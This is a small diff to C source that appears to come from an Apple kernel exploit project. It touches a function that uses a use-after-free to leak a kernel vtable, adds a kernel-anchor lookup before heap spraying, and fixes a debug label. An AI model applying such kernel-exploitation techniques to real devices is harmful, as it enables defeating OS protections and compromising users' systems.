@@ -5,7 +5,7 @@
 #include <IOKit/IOKitLib.h>     // IO*, io_*
 
 #include "common.h"             // DEBUG
-#include "device.h"             // get_os_version
+#include "device.h"             // V_*, get_os_version
 #include "io.h"                 // kOS*, dict_parse, _io_*
 #include "slide.h"              // get_kernel_anchor, get_kernel_slide
 #include "try.h"                // THROW, TRY, RETHROW
@@ -166,6 +166,9 @@ void uaf_panic_leak_vtab(void)
 #define NUMSTR_PAD   64
 #define NUM_CLIENTS  16
 
+    // Before we spawn a bazillion user clients
+    get_kernel_anchor();
+
     DEBUG("Using UAF to leak vtable...");
 
     const char str[4] = "str";
@@ -246,7 +249,7 @@ void uaf_panic_leak_vtab(void)
     }
     else
     {
-        PRINT_BUF("dict_92", dict_90, sizeof(dict_90));
+        PRINT_BUF("dict_90", dict_90, sizeof(dict_90));
     }
     PRINT_BUF("dict_hole", dict_hole, sizeof(dict_hole));
     PRINT_BUF("dict_plug", dict_plug, sizeof(dict_plug));
